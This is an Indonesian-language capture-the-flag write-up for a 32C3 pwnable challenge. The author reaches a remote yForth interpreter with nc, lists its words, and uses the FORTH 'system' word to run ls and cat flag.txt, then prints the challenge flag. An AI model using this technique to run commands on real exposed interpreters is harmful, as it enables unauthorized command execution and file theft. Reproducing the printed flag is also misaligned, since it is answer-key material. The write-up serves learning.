Deskripsi Soal:
<pre>
Connect to 136.243.194.49:1024 and get a shell.
</pre>
Ini adalah soal dengan kategori pwnable yang hanya satu - satunya soal yang dapat saya selesaikan, 
maklum seluruh soal yang ada menurut saya lumayan sulit. Melihat dari perintah di-soal 
tersebut kita hanya perlu melakukan koneksi menggunakan nc.

<pre>
c:\>nc 136.243.194.49 1024
yForth? v0.2  Copyright (C) 2012  Luca Padovani
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions; see LICENSE for details.
</pre>

Di console yForth kita dapat mengetik syntax dari FORTH, FORTH adalah salah satu bahasa pemrograman yang tidak terlalu familiar. Saya ber-asumsi bahwa disini kita akan melakukan command execution, hanya saja disini saya baru mengetahui bahasa pemrograman ini.

Setelah googling beberapa menit mengenai yForth, perintah "words" nampaknya dapat membantu. Dan berikut hasil yang ditemukan.

<pre>
sliteral (marker) (wValue) compile, (doExit) (doFLit) (branch) postpone
constant variable evaluate &#locals &floored -trailing ? [compile] \ source-id
(doValue) (0branch) (compile) ] [ immediate ' . # j i ; : , ( interpret @ > =
< / - + * ! &file-ext &facility &search-order-ext &memory-alloc-ext &floating
&max-char &core-ext source-id .s to #! u> save-input c" <> 0> .r .( save-image
read-const view-error-message s" ." u. cr #> #s <# do if c, u< r@ r> or m* c@
c! bl >r 2@ 2/ 2* 2! 1- 1+ 0= 0< +! */ &exception &block-ext &tools-ext
&wordlists &max-float &address-unit-bits dp bye see u.r nip hex ?do 2r@ 2r>
2>r 0<> pad ver ['] key xor um* s>d rot mod min max dup and abs &string-ext
&locals-ext &double-ext &return-stack-cells tib >in [if] dump tuck true roll
pick (.") (do) char sign move fill environment? type emit hold find loop else
then exit here quit word swap over drop ?dup 2dup /mod &stack-cells &pad last
base input-buffer cmove blank ahead words (?do) value restore-input parse
false erase again while leave count abort >body space +loop begin does> allot
depth chars char+ cells cell+ align 2swap 2over 2drop */mod &file
&facility-ext &search-order &memory-alloc &floating-ext &core &hold state
error search cmove> [then] [else] within unused refill marker system (loop)
(does) repeat [char] unloop abort" spaces create source accept um/mod sm/rem
rshift negate lshift invert fm/mod (check-system) &exception-ext &block &tools
&max-u &max-n &max-d compare /string cs-roll cs-pick :noname (doLit) (doCol)
(+loop) literal execute decimal recurse >number aligned &string &locals
&floating-stack &double &max-ud &counted-string in-input-buffer ok
</pre>

Menganalisa hasil diatas, ada salah satu fungsi yang saya cari yaitu "system". Hanya saja, disini saya tidak mengetahui bagaimana cara memanfaatkan fungsi tersebut di bahasa pemrograman FORTH, untuk itu saya 
mencoba mencari tahu bagaimana memanfaatkan fungsi ini, ditemukanlah artikel berikut.

http://rosettacode.org/wiki/Execute_a_system_command#Forth 

Dijelaskan bahwa penggunaan fungsi "system" pada pemrograman FORTH adalah sebagai berikut.

```C
s" ls" system
```

Setelah saya jalankan pada console yForth, ternyata berhasil ! 

```bash
flag.txt  README.gpl  run.sh  yforth
```

Nampaknya file "flag.txt" sangat menarik untuk dilihat, jalankan kembali perintah dengan syntax dibawah.

```C
s" cat flag.txt" system
```

Dan, ditemukanlah flagnya.

Flag: <b>32C3_a8cfc6174adcb39b8d6dc361e888f17b</b>
